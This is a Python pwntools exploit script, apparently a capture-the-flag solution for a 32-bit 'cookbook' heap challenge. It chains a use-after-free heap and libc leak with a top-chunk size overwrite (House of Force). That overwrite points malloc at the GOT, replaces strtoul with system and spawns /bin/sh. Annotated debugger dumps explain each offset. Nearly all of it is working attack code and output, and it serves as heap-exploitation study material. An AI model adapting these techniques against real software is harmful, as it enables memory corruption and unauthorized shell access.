from pwn import *

p = process("./cookbook", env={"LD_PRELOAD": "libc.so.6"})

elf = ELF("cookbook")
libc = elf.libc

# Name 
p.sendlineafter("?\n", "Damian")
# Create ecipe
p.sendlineafter("[q]uit\n", "c")
# Add a recipe
p.sendlineafter("[q]uit\n", "n")
# Add recipe name
p.sendlineafter("[q]uit\n", "g")
p.sendline("A"*4)
# Add an ingredient and then discard it
p.sendlineafter("[q]uit\n", "a")
p.sendlineafter("? ", "basil")
p.sendlineafter(": ", "1")
# Discarding the recipe
p.sendlineafter("[q]uit\n", "d")
# Printing the recipe as the chunk is already free
# It will trigger the UAF Vulnerability resulting in the address disclosure of the heap
# address of the ingredient we added
p.sendlineafter("[q]uit\n", "p")

# Parsing the leaked address 

p.recvline()
p.recvline()
p.recvline()
p.recvline()
leak = int(p.recv(9))
base_heap = leak - 0x1878
'''
$9 = 6264
pwndbg> p/x 0x9086878 - 0x9085000
$10 = 0x1878
'''
log.info("LEAKED HEAP:    0x%x" %(leak))
log.info("HEAP BASE:      0x%x" %(base_heap))

main_arena = leak - 0x6d8 + 0x2b0 
'''
pwndbg> x/wx  0x96a6878 - 0x6d8 + 0x2b0
0x96a6450:	0xf7f717d8
'''
log.info("MAIN ARENA:     0x%x" %(main_arena))
main_arena_8 = main_arena + 0x8
leak_ing = leak - 0x8

pause()
# `0X40C` was the offset
p.sendlineafter("[q]uit\n", "q")
p.sendlineafter("[q]uit\n", "g")
p.sendlineafter(": ", "0x40c")


'''
Since the main arena of the chunk we alocated contains the 
the associated links to the struct members, we tend to overwrite the ingredient 
address, which once again if tends to be printed, will trigger UAF and 
tries to print the ingredient stored at that specific address but as we know that
we overwrote that with pust@GOT, hence the program will print that,
'''

p.sendline(p32(main_arena_8)+p32(leak_ing)+p32(elf.got['puts'])+b"\x00"*(0x100-0x4-0x4-0x4))
'''
pwndbg> x/20wx 0x8d03450
0x8d03450:	0x08d03458	0x08d03870	0x0804d030	0x00000000
0x8d03460:	0x00000000	0x00000000	0x00000000	0x00000000
0x8d03470:	0x00000000	0x00000000	0x00000000	0x00000000
0x8d03480:	0x00000000	0x00000000	0x00000000	0x00000000
0x8d03490:	0x00000000	0x00000000	0x00000000	0x00000000
pwndbg> x/20wx 0x08d03458
0x8d03458:	0x0804d030	0x00000000	0x00000000	0x00000000
0x8d03468:	0x00000000	0x00000000	0x00000000	0x00000000
0x8d03478:	0x00000000	0x00000000	0x00000000	0x00000000
0x8d03488:	0x00000000	0x00000000	0x00000000	0x00000000
0x8d03498:	0x00000000	0x00000000	0x00000000	0x00000000
pwndbg> x/4wx 0x0804d030
0x804d030 <puts@got.plt>:	0xf7e1eb40	0x080485a6	0xf7de93f0	0xf7dcfd90
'''


# Getting into the ingredient menu again
p.recv()
p.sendline('c')
# Triggering the UAF
p.sendlineafter('[q]uit\n', 'p')
# Getting the puts@LIBC address

p.recvuntil("cals : ")
libc_puts = int(p.recvline().strip(b"\n"))
log.info("PUTS LEAKED:      0x%x" %(libc_puts))
libc.address = libc_puts - libc.symbols['puts']

log.info("LIBC:             0X%x" %(libc.address))

p.sendlineafter('[q]uit\n', 'n')
p.sendlineafter('[q]uit\n', 'g')

p.sendline(b'A'*(896) + p32(0xffffffff))
p.sendlineafter("[q]uit\n", "q")

'''
Wondering why 1036?

      case 'g':
        if ( cur_recipe )
          fgets((char *)cur_recipe + 0x8C, 0x40C, stdin);// overflow!
        else
          puts("can't do it on a null guy");
        continue;
      case 'i':


We had to fill an exact oveflow of 1036 - 0x8c, which points to the top_chunk
pwndbg> top_chunk 
Top chunk
Addr: 0x8c97c88
Size: 0x2000a
pwndbg> p/d 1036 - 0x8c
$57 = 896
pwndbg> x/20wx 0x8c97c88 - 0x20
0x8c97c68:	0x41414141	0x41414141	0x41414141	0x41414141
0x8c97c78:	0x41414141	0x41414141	0x41414141	0x41414141
0x8c97c88:	0xffffffff	0x0002000a	0x00000000	0x00000000
0x8c97c98:	0x00000000	0x00000000	0x00000000	0x00000000
0x8c97ca8:	0x00000000	0x00000000	0x00000000	0x00000000
'''




'''
0x9513848:	0x00000000	0x00000000	0x00000000	0x00000000
0x9513858:	0x00000000	0x00000011	0x095122f0	0x00000000
0x9513868:	0x00000000	0x00000011	0x00000001	0x00000000
0x9513878:	0x00000000	0x00000411	0x00000000	0x00000000
0x9513888:	0x00000000	0x00000000	0x00000000	0x00000000
0x9513898:	0x00000000	0x00000000	0x00000000	0x00000000
0x95138a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x95138b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x95138c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x95138d8:	0x00000000	0x00000000	0x00000000	0x00000000
0x95138e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x95138f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x9513908:	0x00000000	0x41414141	0x41414141	0x41414141
0x9513918:	0x41414141	0x41414141	0x41414141	0x41414141
0x9513928:	0x41414141	0x41414141	0x41414141	0x41414141
0x9513938:	0x41414141	0x41414141	0x41414141	0x41414141
0x9513948:	0x41414141	0x41414141	0x41414141	0x41414141
0x9513958:	0x41414141	0x41414141	0x41414141	0x41414141
0x9513968:	0x41414141	0x41414141	0x41414141	0x41414141
0x9513978:	0x41414141	0x41414141	0x41414141	0x41414141
pwndbg> x/20wx 0x095122f0
0x95122f0:	0x00000002	0x00000004	0x69736162	0x0000006c
0x9512300:	0x00000000	0x00000000	0x00000000	0x00000000
0x9512310:	0x00000000	0x00000000	0x00000000	0x00000000
0x9512320:	0x00000000	0x00000000	0x00000000	0x00000000
0x9512330:	0x00000000	0x00000000	0x00000000	0x00000000
pwndbg> 
'''

p.sendlineafter("[q]uit\n", "g")
log.info("TOP_CHUNK:         0x%x" %(leak + 0x410))

# We calcukate the top chunk address and then subtracted it from the GOT entry and made it hex
# This triggers the malloc to return a pointer of the GOT address of free@GOT
p.sendlineafter(": ", str(hex((elf.got['free'] - 8 - (leak + 0x410)))))
p.sendlineafter("[q]uit\n", "g")
p.sendlineafter(": ", "29")

# GOT Table with strtoul replaced with system

got_table = p32(libc.symbols['fgets'])
got_table += p32(libc.symbols['alarm'])
got_table += p32(libc.symbols['__stack_chk_fail'])
got_table += p32(libc.symbols['malloc'])
got_table += p32(libc.symbols['puts'])
got_table += p32(elf.got['__gmon_start__'])
got_table += p32(libc.symbols['system'])
'''


After sending the `got_table`, even though the strtoul can be overwritten directly, but then I didn't worked out properly.
So, in order to get through the workflow of these GOT table, I was able to overwrite the table one after another, now 
to get it I made a replica of GOT table which was supposed to correspond it.


Before the malloc call to overwrite the GOT table, to do a sanity check I allocated 29 bytes of space and sent null bytes to see
what is being overwritten, which resulted in

gef➤  got

GOT protection: Partial RelRO | GOT functions: 16
 
[0x804d00c] strcmp@GLIBC_2.0  →  0xf7e7bc20
[0x804d010] printf@GLIBC_2.0  →  0xf7d762d0
[0x804d014] strcspn@GLIBC_2.0  →  0xf7e7d830
[0x804d018] free@GLIBC_2.0  →  0xf7da0250
[0x804d01c] memcpy@GLIBC_2.0  →  0x31
[0x804d020] fgets@GLIBC_2.0  →  0x0
[0x804d024] alarm@GLIBC_2.0  →  0x0
[0x804d028] __stack_chk_fail@GLIBC_2.4  →  0x0
[0x804d02c] malloc@GLIBC_2.0  →  0x0
[0x804d030] puts@GLIBC_2.0  →  0x0
[0x804d034] __gmon_start__  →  0x0
[0x804d038] strtoul@GLIBC_2.0  →  0x0
[0x804d03c] __libc_start_main@GLIBC_2.0  →  0xf7d3000a
[0x804d040] setvbuf@GLIBC_2.0  →  0xf7d8d2b0
[0x804d044] atoi@GLIBC_2.0  →  0x80485e6
[0x804d048] calloc@GLIBC_2.0  →  0xf7da0880

Hence, forging the GOT table with the entry of `strtoul` being of system, we successfully overwrote the GOT address of `strtoul`


gef➤  got

GOT protection: Partial RelRO | GOT functions: 16
 
[0x804d00c] strcmp@GLIBC_2.0  →  0xf7eb4c20
[0x804d010] printf@GLIBC_2.0  →  0xf7daf2d0
[0x804d014] strcspn@GLIBC_2.0  →  0xf7eb6830
[0x804d018] free@GLIBC_2.0  →  0xf7dd9250
[0x804d01c] memcpy@GLIBC_2.0  →  0x31
[0x804d020] fgets@GLIBC_2.0  →  0xf7dc3fb0
[0x804d024] alarm@GLIBC_2.0  →  0xf7e1d010
[0x804d028] __stack_chk_fail@GLIBC_2.4  →  0xf7e67b60
[0x804d02c] malloc@GLIBC_2.0  →  0xf7dd8c30
[0x804d030] puts@GLIBC_2.0  →  0xf7dc5b40
[0x804d034] __gmon_start__  →  0x804d034
[0x804d038] strtoul@GLIBC_2.0  →  0xf7d9b200
[0x804d03c] __libc_start_main@GLIBC_2.0  →  0xf7d7000a
[0x804d040] setvbuf@GLIBC_2.0  →  0xf7dc62b0
[0x804d044] atoi@GLIBC_2.0  →  0x80485e6
[0x804d048] calloc@GLIBC_2.0  →  0xf7dd9880
gef➤  p system
$1 = {int (const char *)} 0xf7d9b200 <__libc_system>
gef➤  c

'''

p.sendline(got_table)
p.sendlineafter("[q]uit\n", "g")

# Sending `/bin/sh\x00` since strtoul was overwritten with `system`
# This will result in `system("/bin/sh\x00")`, spawning a shell
p.sendlineafter(": ", "/bin/sh\x00")

# Switch to interact :D
p.interactive()